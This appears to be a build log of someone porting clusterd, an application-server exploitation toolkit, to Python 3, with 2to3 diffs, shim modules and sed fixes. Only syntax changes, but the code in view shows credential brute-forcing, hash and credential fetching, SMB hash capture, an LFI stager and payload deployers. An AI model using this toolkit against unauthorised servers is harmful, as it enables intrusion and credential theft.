+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/axis2/auxiliary/info_dump.py	(original)RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion/authenticate.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion/auxiliary/fetch_hashes.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion/auxiliary/info_dump.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion/deployers/fck_editor.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion/deployers/lfi_stager.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/glassfish/authenticate.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/glassfish/auxiliary/list_wars.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/authenticate.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/auxiliary/fetch_creds.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/auxiliary/info_dump.py
+
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/axis2/auxiliary/info_dump.py	(refactored)
+@@ -2,6 +2,7 @@
+ from log import LOG
+ from re import findall
+ import utility
++from six.moves import zip
+ 
+ 
+ class Auxiliary:
+@@ -25,7 +26,7 @@
+ 
+         try:
+             response = utility.requests_get(base + uri)
+-        except Exception, e:
++        except Exception as e:
+             utility.Msg("Failed to fetch info: %s" % e, LOG.ERROR)
+             return
+ 
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion/authenticate.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion/authenticate.py	(refactored)
+@@ -1,3 +1,4 @@
++from __future__ import print_function
+ from requests.auth import HTTPDigestAuth
+ from requests.utils import dict_from_cookiejar
+ from log import LOG
+@@ -69,7 +70,7 @@
+             elif len(res.history) > 0:
+                 return (dict_from_cookiejar(res.history[0].cookies), None)
+ 
+-    except Exception, e:
++    except Exception as e:
+         utility.Msg("Error authenticating: %s" % e, LOG.ERROR)
+         return (None, None)
+ 
+@@ -127,7 +128,7 @@
+             utility.Msg("Sucessfully passed the hash", LOG.DEBUG)
+             return (dict_from_cookiejar(res.history[0].cookies), None)
+         
+-    except Exception, e:
++    except Exception as e:
+         utility.Msg("Error authenticating: %s" % e, LOG.ERROR)
+ 
+ 
+@@ -174,7 +175,7 @@
+             with open(state.bf_wordlist, 'r') as f:
+                 # ensure everything is ascii or requests will explode
+                 wordlist = [x.decode('ascii', 'ignore').rstrip() for x in f.readlines()]
+-        except Exception, e:
++        except Exception as e:
+             utility.Msg("Failed to read wordlist (%s)" % e, LOG.ERROR)
+             return
+ 
+@@ -191,7 +192,7 @@
+ 
+                 cook = _auth(state.bf_user, word, url, version)
+                 if cook:
+-                    print '' # newline
++                    print('') # newline
+ 
+                     if not (state.bf_user, word) in default_credentials:
+                         default_credentials.insert(0, (state.bf_user, word))
+@@ -200,7 +201,7 @@
+                                         (state.bf_user, word), LOG.SUCCESS)
+                     return cook
+ 
+-            print ''
++            print('')
+ 
+         except KeyboardInterrupt:
+             pass
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion/auxiliary/fetch_hashes.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion/auxiliary/fetch_hashes.py	(refactored)
+@@ -2,6 +2,7 @@
+ from log import LOG
+ import utility
+ import re
++from six.moves import range
+ 
+ 
+ class Auxiliary:
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion/auxiliary/info_dump.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion/auxiliary/info_dump.py	(refactored)
+@@ -4,6 +4,7 @@
+ from log import LOG
+ from re import findall
+ import utility
++from six.moves import zip
+ 
+ 
+ class Auxiliary:
+@@ -49,7 +50,7 @@
+ 
+         try:
+             response = utility.requests_get(base + uri, cookies=cookies)
+-        except Exception, e:
++        except Exception as e:
+             utility.Msg("Failed to fetch info: %s" % e, LOG.ERROR)
+             return
+             
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion/deployers/fck_editor.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion/deployers/fck_editor.py	(refactored)
+@@ -28,7 +28,7 @@
+ 
+     try:
+         payload = {"NewFile" : ("asdf.txt", open(cfm_path, "r").read())}
+-    except Exception, e:
++    except Exception as e:
+         utility.Msg("Error reading file: %s" % e, LOG.ERROR)
+         return
+     
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion/deployers/lfi_stager.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion/deployers/lfi_stager.py	(refactored)
+@@ -1,3 +1,4 @@
++from __future__ import print_function
+ from src.platform.coldfusion.interfaces import CINTERFACES
+ from src.module.deploy_utils import parse_war_path, _serve, waitServe, killServe
+ from threading import Thread
+@@ -8,6 +9,7 @@
+ from log import LOG
+ import state
+ import utility
++from six.moves import range
+ 
+ title = CINTERFACES.CFM
+ versions = ['6.0', '7.0', '8.0'] 
+@@ -113,7 +115,7 @@
+ 
+         luri = uri.format("{0}" + path)
+         if checkURL(fingerengine, base + luri, 'Severity'):
+-            print luri
++            print(luri)
+             return True
+        
+ 
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/glassfish/authenticate.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/glassfish/authenticate.py	(refactored)
+@@ -1,3 +1,4 @@
++from __future__ import print_function
+ from src.platform.glassfish.interfaces import GINTERFACES
+ from requests.auth import HTTPBasicAuth
+ from requests.utils import dict_from_cookiejar
+@@ -57,7 +58,7 @@
+ 
+                     cook = _auth(state.bf_user, word, url)
+                     if cook:
+-                        print ''
++                        print('')
+ 
+                         if not (state.bf_user, word) in default_credentials:
+                             default_credentials.insert(0, (state.bf_user, word))
+@@ -66,7 +67,7 @@
+                                                                LOG.SUCCESS)
+                         return cook
+ 
+-                print ''
++                print('')
+ 
+             except KeyboardInterrupt:
+                 pass
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/glassfish/auxiliary/list_wars.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/glassfish/auxiliary/list_wars.py	(refactored)
+@@ -50,7 +50,7 @@
+         if response.status_code is 200:
+ 
+             data = json.loads(response.content)
+-            if not 'properties' in data.keys():
++            if not 'properties' in list(data.keys()):
+                 utility.Msg("No applications found.")
+                 return
+ 
+@@ -71,7 +71,7 @@
+         if response.status_code is 200:
+ 
+             data = json.loads(response.content)
+-            if not u"Child Resources" in data.keys():
++            if not u"Child Resources" in list(data.keys()):
+                 utility.Msg("No apps found")
+                 return
+ 
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/authenticate.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/authenticate.py	(refactored)
+@@ -1,3 +1,4 @@
++from __future__ import print_function
+ from src.platform.jboss.interfaces import JINTERFACES
+ from requests.auth import HTTPBasicAuth, HTTPDigestAuth
+ from requests.utils import dict_from_cookiejar
+@@ -97,7 +98,7 @@
+ 
+                     cook = _auth(state.bf_user, word, url, version)
+                     if cook:
+-                        print ''  # newline
++                        print('')  # newline
+ 
+                         # lets insert these credentials to the default list so we
+                         # don't need to bruteforce it each time
+@@ -108,7 +109,7 @@
+                                         (state.bf_user, word), LOG.SUCCESS)
+                         return cook
+ 
+-                print ''
++                print('')
+ 
+             except KeyboardInterrupt:
+                 pass
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/auxiliary/fetch_creds.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/auxiliary/fetch_creds.py	(refactored)
+@@ -68,5 +68,5 @@
+                 else:
+                     tick += 1
+ 
+-        except Exception, e:
++        except Exception as e:
+             utility.Msg("Failed: %s" % e, LOG.ERROR)
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/auxiliary/info_dump.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/auxiliary/info_dump.py	(refactored)
+@@ -4,6 +4,8 @@
+ from log import LOGRefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/auxiliary/list_wars.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/auxiliary/smb_hashes.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/deployers/bsh_deploy.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/deployers/seam_upload.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/fingerprints/JBossRMI.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/railo/authenticate.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/railo/auxiliary/info_dump.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/railo/auxiliary/password_lfi.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/railo/auxiliary/smb_hashes.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/authenticate.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/interfaces.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/undeployer.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/auxiliary/fetch_creds.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/auxiliary/smb_hashes.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/deployers/manage_deploy.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/deployers/webmanage_deploy.py
+
+ from re import findall
+ import utility
++from six.moves import range
++from six.moves import zip
+ 
+ 
+ class Auxiliary:
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/auxiliary/list_wars.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/auxiliary/list_wars.py	(refactored)
+@@ -106,7 +106,7 @@
+         for item in json_list:
+ 
+             item_dict = dict(item)
+-            if "address" in item_dict.keys():
++            if "address" in list(item_dict.keys()):
+                 utility.Msg("Deployment found: %s" % 
+                                     dict(item_dict['address'][0])['deployment'])
+ 
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/auxiliary/smb_hashes.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/auxiliary/smb_hashes.py	(refactored)
+@@ -131,7 +131,7 @@
+ 
+                 break
+ 
+-        except Exception, e:
++        except Exception as e:
+             utility.Msg("Socket error: %s" % e, LOG.ERROR)
+         finally:
+             sock.close()
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/deployers/bsh_deploy.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/deployers/bsh_deploy.py	(refactored)
+@@ -89,7 +89,7 @@
+                     f2.write(tmp)
+ 
+         return True
+-    except Exception, e:
++    except Exception as e:
+         utility.Msg(e, LOG.ERROR)
+     
+     return False
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/deployers/seam_upload.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/deployers/seam_upload.py	(refactored)
+@@ -8,6 +8,7 @@
+ from string import ascii_lowercase
+ from base64 import b64encode
+ import utility
++from six.moves import range
+ 
+ title = JINTERFACES.WM
+ versions = ['5.1', '6.0', '6.1']
+@@ -42,7 +43,7 @@
+     try:
+         with open(war_file) as f:
+             jsp = f.read()
+-    except Exception, e:
++    except Exception as e:
+         utility.Msg("Error reading payload file '%s': %s" % (war_file, e), LOG.ERROR)
+         return False
+ 
+@@ -73,7 +74,7 @@
+             try:
+                 response = utility.requests_post(url, data = uri,
+                                                  cookies=cookies[0], auth=cookies[1])
+-            except Exception, e:
++            except Exception as e:
+                 utility.Msg("Error with authenticated request: %s" % str(e), LOG.ERROR)
+                 return
+         else:
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/fingerprints/JBossRMI.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/fingerprints/JBossRMI.py	(refactored)
+@@ -28,7 +28,7 @@
+             if res == 0:
+                 return True
+ 
+-        except Exception, e:
++        except Exception as e:
+             utility.Msg(e, LOG.ERROR)
+ 
+         return False
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/railo/authenticate.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/railo/authenticate.py	(refactored)
+@@ -1,3 +1,4 @@
++from __future__ import print_function
+ from src.platform.railo.interfaces import RINTERFACES
+ from requests.utils import dict_from_cookiejar
+ from collections import OrderedDict
+@@ -67,11 +68,11 @@
+ 
+                 cook = _auth(word, url, title)
+                 if cook:
+-                    print ''
++                    print('')
+                     utility.Msg("Successful login with %s" % word, LOG.SUCCESS)
+                     return cook
+ 
+-            print ''
++            print('')
+ 
+         except KeyboardInterrupt:
+             pass
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/railo/auxiliary/info_dump.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/railo/auxiliary/info_dump.py	(refactored)
+@@ -4,6 +4,7 @@
+ from log import LOG
+ from re import findall
+ import utility
++from six.moves import zip
+ 
+ class Auxiliary:
+ 
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/railo/auxiliary/password_lfi.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/railo/auxiliary/password_lfi.py	(refactored)
+@@ -64,7 +64,7 @@
+         try:
+             res = check_output(["./railopass.sh", password],
+                                 cwd='./src/lib/railo/railopass')
+-        except Exception, e:
++        except Exception as e:
+             utility.Msg(e, LOG.DEBUG)
+             res = e
+ 
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/railo/auxiliary/smb_hashes.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/railo/auxiliary/smb_hashes.py	(refactored)
+@@ -103,7 +103,7 @@
+ 
+                 break
+ 
+-        except Exception, e:
++        except Exception as e:
+             utility.Msg("Socket error: %s" % e, LOG.ERROR)
+         finally:
+             sock.close()
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/authenticate.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/authenticate.py	(refactored)
+@@ -1,3 +1,4 @@
++from __future__ import print_function
+ from src.platform.tomcat.interfaces import TINTERFACES
+ from requests.auth import HTTPBasicAuth
+ from requests.utils import dict_from_cookiejar
+@@ -60,7 +61,7 @@
+ 
+                     cook = _auth(state.bf_user, word, url)
+                     if cook:
+-                        print ''
++                        print('')
+ 
+                         # lets insert these credentials to the default list so we
+                         # don't need to bruteforce it each time
+@@ -71,7 +72,7 @@
+                                                                 LOG.SUCCESS)
+                         return cook
+ 
+-                print ''
++                print('')
+ 
+             except KeyboardInterrupt:
+                 pass
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/interfaces.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/interfaces.py	(refactored)
+@@ -6,6 +6,7 @@
+ import random
+ import string
+ import utility
++from six.moves import range
+ 
+ 
+ class TINTERFACES:
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/undeployer.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/undeployer.py	(refactored)
+@@ -80,7 +80,7 @@
+             if len(data) > 0:
+                 csrf = data[0]
+ 
+-    except Exception, e:
++    except Exception as e:
+         utility.Msg("Failed to fetch CSRF token (HTTP %d)" % response.status_code,
+                                                              LOG.ERROR)
+         csrf = None
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/auxiliary/fetch_creds.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/auxiliary/fetch_creds.py	(refactored)
+@@ -2,6 +2,7 @@
+ from re import findall
+ from log import LOG
+ import utility
++from six.moves import zip
+ 
+ class Auxiliary:
+     """ Tomcat 3.x allows traversing the local path, so we can use that to
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/auxiliary/smb_hashes.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/auxiliary/smb_hashes.py	(refactored)
+@@ -113,7 +113,7 @@
+ 
+                 break
+ 
+-        except Exception, e:
++        except Exception as e:
+             utility.Msg("Socket error: %s" % e, LOG.ERROR)
+         finally:
+             sock.close()
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/deployers/manage_deploy.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/deployers/manage_deploy.py	(refactored)
+@@ -31,7 +31,7 @@
+ 
+     try:
+         files = open(war_file, 'rb')
+-    except Exception, e:
++    except Exception as e:
+         utility.Msg(e, LOG.ERROR)
+         return
+ 
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/deployers/webmanage_deploy.py	(original)RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/weblogic/authenticate.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/weblogic/interfaces.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/weblogic/auxiliary/info_dump.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/weblogic/auxiliary/smb_hashes.py
+RefactoringTool: Files that were modified:
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/auxengine.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/deployer.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/fingerprint.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/utility.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/lib/cifstrap.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/module/deploy_utils.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/module/invoke_payload.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/axis2/authenticate.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/axis2/auxiliary/info_dump.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion/authenticate.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion/auxiliary/fetch_hashes.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion/auxiliary/info_dump.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion/deployers/fck_editor.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion/deployers/lfi_stager.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/glassfish/authenticate.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/glassfish/auxiliary/list_wars.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/authenticate.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/auxiliary/fetch_creds.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/auxiliary/info_dump.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/auxiliary/list_wars.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/auxiliary/smb_hashes.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/deployers/bsh_deploy.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/deployers/seam_upload.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/fingerprints/JBossRMI.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/railo/authenticate.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/railo/auxiliary/info_dump.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/railo/auxiliary/password_lfi.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/railo/auxiliary/smb_hashes.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/authenticate.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/interfaces.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/undeployer.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/auxiliary/fetch_creds.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/auxiliary/smb_hashes.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/deployers/manage_deploy.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/deployers/webmanage_deploy.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/weblogic/authenticate.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/weblogic/interfaces.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/weblogic/auxiliary/info_dump.py
+RefactoringTool: /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/weblogic/auxiliary/smb_hashes.py
+
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/deployers/webmanage_deploy.py	(refactored)
+@@ -45,7 +45,7 @@
+         if fingerprint.version in ['4.0', '4.1']:
+             tag = 'installWar'
+         files = {tag : (war_path + '.war', open(war_file, 'rb'))}
+-    except Exception, e:
++    except Exception as e:
+         utility.Msg(e, LOG.ERROR)
+         return
+ 
+@@ -82,7 +82,7 @@
+             if len(data) > 0:
+                 csrf = data[0]
+ 
+-    except Exception, e:
++    except Exception as e:
+         utility.Msg("Failed to fetch CSRF token (HTTP %d)" % response.status_code,
+                                                              LOG.ERROR)
+         csrf = None
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/weblogic/authenticate.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/weblogic/authenticate.py	(refactored)
+@@ -1,3 +1,4 @@
++from __future__ import print_function
+ from src.platform.weblogic.interfaces import WINTERFACES
+ from requests.utils import dict_from_cookiejar
+ from sys import stdout
+@@ -37,7 +38,7 @@
+                                     (usr, pswd), LOG.DEBUG)
+                     return (cookies, None)
+ 
+-    except Exception, e: 
++    except Exception as e: 
+         utility.Msg("Failed to authenticate: %s" % e)
+      
+     return False 
+@@ -82,7 +83,7 @@
+         try:
+             with open(state.bf_wordlist, 'r') as f:
+                 wordlist = [x.decode('ascii', "ignore").rstrip() for x in f.readlines()]
+-        except Exception, e:
++        except Exception as e:
+             utility.Msg(e, LOG.DEBUG)
+             return (None, None)
+ 
+@@ -98,7 +99,7 @@
+ 
+                 auth = _auth(state.bf_user, word, ip, fingerprint)
+                 if auth:
+-                    print ''
++                    print('')
+ 
+                     # insert creds into default cred list
+                     if not (state.bf_user, word) in default_credentials:
+@@ -108,7 +109,7 @@
+                                     (state.bf_user, word), LOG.SUCCESS)
+                     return auth
+ 
+-            print ''
++            print('')
+ 
+         except KeyboardInterrupt:
+             pass
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/weblogic/interfaces.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/weblogic/interfaces.py	(refactored)
+@@ -37,7 +37,7 @@
+         except exceptions.Timeout:
+             utility.Msg("{0} timeout to {1}:{2}".format(self.platform, ip,
+                                                         rport), LOG.DEBUG)
+-        except exceptions.ConnectionError, e:
++        except exceptions.ConnectionError as e:
+             utility.Msg("{0} connection error to {1}:{2} ({3})".format(
+                                                                 self.platform,
+                                                                 ip, rport, e),
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/weblogic/auxiliary/info_dump.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/weblogic/auxiliary/info_dump.py	(refactored)
+@@ -4,6 +4,7 @@
+ from log import LOG
+ from re import findall
+ import utility
++from six.moves import zip
+ 
+ class Auxiliary:
+ 
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/weblogic/auxiliary/smb_hashes.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/weblogic/auxiliary/smb_hashes.py	(refactored)
+@@ -121,7 +121,7 @@
+ 
+                 break
+ 
+-        except Exception, e:
++        except Exception as e:
+             utility.Msg("Socket error: %s" % e, LOG.ERROR)
+         finally:
+             sock.close()
+[2026-03-04 13:55:29] RUN(user:spabam): bash -lc cat > "/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/commands.py" <<'PY'
+import subprocess
+
+
+def getoutput(cmd):
+    return subprocess.getoutput(cmd)
+PY
+[2026-03-04 13:55:29] RUN(user:spabam): bash -lc cat > "/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/sitecustomize.py" <<'PY'
+import importlib.machinery
+import importlib.util
+import os
+import sys
+
+
+class _LoaderShim:
+    def __init__(self, loader, default_name):
+        self._loader = loader
+        self._default_name = default_name
+
+    def load_module(self, fullname):
+        name = fullname or self._default_name
+        if name in sys.modules:
+            return sys.modules[name]
+        if hasattr(self._loader, 'load_module'):
+            return self._loader.load_module(name)
+        spec = importlib.util.spec_from_loader(name, self._loader)
+        if spec is None:
+            raise ImportError(name)
+        module = importlib.util.module_from_spec(spec)
+        sys.modules[name] = module
+        self._loader.exec_module(module)
+        return module
+
+
+def _find_module(self, fullname, path=None):
+    spec = self.find_spec(fullname)
+    if spec is not None and spec.loader is not None:
+        return _LoaderShim(spec.loader, fullname)
+
+    base_path = getattr(self, 'path', None)
+    if base_path:
+        module_path = os.path.join(base_path, fullname + '.py')
+        if os.path.isfile(module_path):
+            loader = importlib.machinery.SourceFileLoader(fullname, module_path)
+            return _LoaderShim(loader, fullname)
+    return None
+
+
+if not hasattr(importlib.machinery.FileFinder, 'find_module'):
+    importlib.machinery.FileFinder.find_module = _find_module
+PY
+[2026-03-04 13:55:29] RUN(user:spabam): bash -lc cat > "/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/HTMLParser.py" <<'PY'
+from html.parser import HTMLParser
+PY
+[2026-03-04 13:55:29] RUN(user:spabam): bash -lc cat > "/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/urlparse.py" <<'PY'
+from urllib.parse import *
+PY
+[2026-03-04 13:55:29] RUN(user:spabam): bash -lc cat > "/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/ConfigParser.py" <<'PY'
+from configparser import *
+PY
+[2026-03-04 13:55:29] RUN(user:spabam): bash -lc cat > "/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/Queue.py" <<'PY'
+from queue import *
+PY
+[2026-03-04 13:55:29] RUN(user:spabam): bash -lc cat > "/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/httplib.py" <<'PY'
+from http.client import *
+PY
+[2026-03-04 13:55:29] RUN(user:spabam): sed -i s/len(fingerengine\\.fingerprints) is 0/len(fingerengine.fingerprints) == 0/ /home/spabam/.venv/cms_scanner/_build/clusterd-src/clusterd.py
+[2026-03-04 13:55:29] RUN(user:spabam): sed -i s/timeout is not 10/timeout != 10/; s/timeout is 0/timeout == 0/ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/module/deploy_utils.py
+[2026-03-04 13:55:29] RUN(user:spabam): sed -i s/re.findall('\\d+\/open',item)/re.findall(r'\\d+\/open', item)/ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/module/discovery.py
